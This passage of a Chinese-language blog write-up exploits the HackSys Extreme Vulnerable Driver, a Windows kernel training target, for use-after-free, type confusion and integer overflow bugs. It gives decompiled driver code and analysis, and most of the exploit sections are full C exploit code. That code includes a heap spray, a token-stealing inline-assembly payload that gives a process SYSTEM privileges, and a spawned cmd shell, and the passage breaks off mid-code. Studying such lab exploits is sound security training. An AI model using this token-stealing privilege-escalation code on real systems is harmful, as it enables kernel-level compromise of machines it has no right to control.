class="number">0x58</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 指向我们的shellcode</span></span><br><span class="line">	*(PDWORD)fakechunk = (DWORD)ShellCode;</span><br><span class="line">	<span class="comment">// 用A填满该chunk</span></span><br><span class="line">	<span class="comment">// RtlFillMemory(fakeG_UseAfterFree-&gt;bufffer, sizeof(fakeG_UseAfterFree-&gt;bufffer), &#x27;A&#x27;);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 堆喷射</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Start to heap spray...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		DeviceIoControl(hDevice, <span class="number">0x22201F</span>, fakechunk, <span class="number">0x58</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Start to call UseUaFObject()...\n&quot;</span>);</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x222017</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Start to create cmd...\n&quot;</span>);</span><br><span class="line">	CreateCmd();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="7-TypeConfusing-TriggerTypeConfusion"><a href="#7-TypeConfusing-TriggerTypeConfusion" class="headerlink" title="7.TypeConfusing-TriggerTypeConfusion"></a>7.TypeConfusing-TriggerTypeConfusion</h1><p>该漏洞为类型混淆漏洞</p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先申请了8字节的非分页内存空间，之后调用<code>ProbForRead</code>验证用户缓冲区，之后就将用户缓冲区的内容复制到申请的非分页内存空间中，而未进行类型验证，然后<code>TypeConfusionObjectInitializer</code>中会执行 <code>Callback()</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TriggerTypeConfusion</span><span class="params">(_USER_TYPE_CONFUSION_OBJECT *UserTypeConfusionObject)</span></span><br><span class="line">&#123;</span><br><span class="line">  _KERNEL_TYPE_CONFUSION_OBJECT *v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> Status; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  ProbeForRead(UserTypeConfusionObject, <span class="number">8u</span>, <span class="number">1u</span>);</span><br><span class="line">  v1 = ExAllocatePoolWithTag(NonPagedPool, <span class="number">8u</span>, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%X\n&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, v1);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserTypeConfusionObject: 0x%p\n&quot;</span>, UserTypeConfusionObject);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelTypeConfusionObject: 0x%p\n&quot;</span>, v1);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelTypeConfusionObject Size: 0x%X\n&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *v1 = *UserTypeConfusionObject;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelTypeConfusionObject-&gt;ObjectID: 0x%p\n&quot;</span>, v1-&gt;ObjectID);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelTypeConfusionObject-&gt;ObjectType: 0x%p\n&quot;</span>, v1-&gt;Callback);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Type Confusion\n&quot;</span>);</span><br><span class="line">    Status = TypeConfusionObjectInitializer(v1);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Freeing KernelTypeConfusionObject Object\n&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, v1);</span><br><span class="line">    ExFreePoolWithTag(v1, <span class="number">0x6B636148</span>u);</span><br><span class="line">    result = Status;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    result = <span class="number">-1073741801</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TypeConfusionObjectInitializer</span><span class="params">(_KERNEL_TYPE_CONFUSION_OBJECT *KernelTypeConfusionObject)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelTypeConfusionObject-&gt;Callback: 0x%p\n&quot;</span>, KernelTypeConfusionObject-&gt;Callback);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Calling Callback\n&quot;</span>);</span><br><span class="line">  KernelTypeConfusionObject-&gt;Callback();</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Kernel Type Confusion Object Initialized\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><p>下面两种方法都可以(其实是一种)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UserObject</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG_PTR ObjectID;</span><br><span class="line">    ULONG_PTR ObjectType;</span><br><span class="line">&#125; UserObject, *PUserObject;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KTHREAD_OFFSET 0x124  <span class="comment">// nt!_KPCR.PcrbData.CurrentThread</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPROCESS_OFFSET 0x050 <span class="comment">// nt!_KTHREAD.ApcState.Process</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PID_OFFSET 0x0B4      <span class="comment">// nt!_EPROCESS.UniqueProcessId</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLINK_OFFSET 0x0B8    <span class="comment">// nt!_EPROCESS.ActiveProcessLinks.Flink</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOKEN_OFFSET 0x0F8    <span class="comment">// nt!_EPROCESS.Token</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSTEM_PID 0x004      <span class="comment">// SYSTEM Process PID</span></span></span><br><span class="line">VOID <span class="title function_">TokenStealingPayloadWin7</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Importance of Kernel Recovery</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">		pushad</span><br><span class="line"></span><br><span class="line">		; 获取当前进程EPROCESS</span><br><span class="line">		xor eax, eax</span><br><span class="line">		mov eax, fs: [eax + KTHREAD_OFFSET]</span><br><span class="line">		mov eax, [eax + EPROCESS_OFFSET]</span><br><span class="line">		mov ecx, eax</span><br><span class="line"></span><br><span class="line">		; 搜索system进程EPROCESS</span><br><span class="line">		mov edx, SYSTEM_PID</span><br><span class="line">		SearchSystemPID :</span><br><span class="line">		mov eax, [eax + FLINK_OFFSET]</span><br><span class="line">			sub eax, FLINK_OFFSET</span><br><span class="line">			cmp[eax + PID_OFFSET], edx</span><br><span class="line">			jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">			; token窃取</span><br><span class="line">			mov edx, [eax + TOKEN_OFFSET]</span><br><span class="line">			mov[ecx + TOKEN_OFFSET], edx</span><br><span class="line"></span><br><span class="line">			; 环境还原 + 返回</span><br><span class="line">			popad</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">CreateCmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    STARTUPINFO si = &#123;<span class="keyword">sizeof</span>(si)&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_SHOW;</span><br><span class="line">    WCHAR wzFilePath[MAX_PATH] = &#123;<span class="string">L&quot;cmd.exe&quot;</span>&#125;;</span><br><span class="line">    BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span> (bReturn)</span><br><span class="line">        CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG UserBufferSize = <span class="keyword">sizeof</span>(UserObject);</span><br><span class="line">    PVOID EopPayload = &amp;TokenStealingPayloadWin7;</span><br><span class="line">    HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    PUserObject UserBuffer = (PUserObject)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);</span><br><span class="line"></span><br><span class="line">    UserBuffer-&gt;ObjectID = (ULONG_PTR)EopPayload;</span><br><span class="line">    UserBuffer-&gt;ObjectType = (ULONG_PTR)EopPayload;</span><br><span class="line"></span><br><span class="line">    ULONG WriteRet = <span class="number">0</span>;</span><br><span class="line">    DeviceIoControl(hDevice, <span class="number">0x222023</span>, (LPVOID)UserBuffer, UserBufferSize, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;WriteRet, <span class="literal">NULL</span>);</span><br><span class="line">    CreateCmd();</span><br><span class="line">    HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserBuffer);</span><br><span class="line">    UserBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// HANDLE hDevice = NULL;</span></span><br><span class="line">    <span class="comment">// hDevice = CreateFileA(&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);</span></span><br><span class="line">    <span class="comment">// if (hDevice == INVALID_HANDLE_VALUE)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     printf(&quot;[-] Error - Unable to obtain a handle to the driver, error code %d\n&quot;, GetLastError());</span></span><br><span class="line">    <span class="comment">//     exit(1);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// // 4.DeviceIoControl给0环发请求并接收返回结果</span></span><br><span class="line">    <span class="comment">// DWORD dwRet = 0;</span></span><br><span class="line">    <span class="comment">// char exp_TypeConfusion[8] = &#123;0&#125;;</span></span><br><span class="line">    <span class="comment">// memset(exp_TypeConfusion, &#x27;A&#x27;, sizeof(exp_TypeConfusion));</span></span><br><span class="line">    <span class="comment">// PVOID EopPayload = &amp;TokenStealingPayloadWin7;</span></span><br><span class="line">    <span class="comment">// // memcpy(&amp;exp_TypeConfusion[4], &amp;EopPayload, 4);</span></span><br><span class="line">    <span class="comment">// // DeviceIoControl(hDevice, 0x222023, exp_TypeConfusion, 0xffffffff, NULL, 0, &amp;dwRet, NULL);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h1 id="8-TriggerIntegerOverflow"><a href="#8-TriggerIntegerOverflow" class="headerlink" title="8.TriggerIntegerOverflow"></a>8.TriggerIntegerOverflow</h1><p>整数溢出</p>
<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Size是用户缓冲区长度，一个无符号整数，占4字节的空间；如果满足条件条件<code>if(Size+4&lt;0x800)</code>，将用户缓冲区复制进内核缓冲区，遇到<code>0x0BAD0B0B0</code>则停止复制，当Size很大时，如<code>0xffffffff+4=3</code>可以绕过if语句，存在整数溢出漏洞。绕过验证条件之后可以构造足够大的数据造成栈溢出，进而执行任意代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TriggerIntegerOverflow</span><span class="params">(<span class="type">void</span> *UserBuffer, <span class="type">unsigned</span> <span class="type">int</span> Size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> *v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> KernelBuffer[<span class="number">512</span>]; <span class="comment">// [esp+10h] [ebp-820h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Count; <span class="comment">// [esp+810h] [ebp-20h]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+818h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  v3 = UserBuffer;</span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">0x800</span>u, <span class="number">1u</span>);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%X\n&quot;</span>, Size);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, KernelBuffer);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%X\n&quot;</span>, <span class="number">2048</span>);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Integer Overflow (Arithmetic Overflow)\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Size + <span class="number">4</span> &lt;= <span class="number">0x800</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &lt; Size &gt;&gt; <span class="number">2</span> &amp;&amp; *v3 != <span class="number">0xBAD0B0B0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      KernelBuffer[v2] = *v3++;</span><br><span class="line">      Count = ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Invalid UserBuffer Size: 0x%X\n&quot;</span>, Size);</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">    result = <span class="number">0xC0000206</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用kali系统<code>/usr/share/metasploit-framework/tools/exploit下的pattern_create.rb</code>生成字符串：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]</span><br><span class="line">└─$ ./pattern_create.rb -l 0x900</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">0x901</span>] = <span class="string">&quot;xxxxxxxxx&quot;</span>;</span><br><span class="line">	PVOID EopPayload = &amp;TokenStealingPayloadWin7;</span><br><span class="line">	HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, 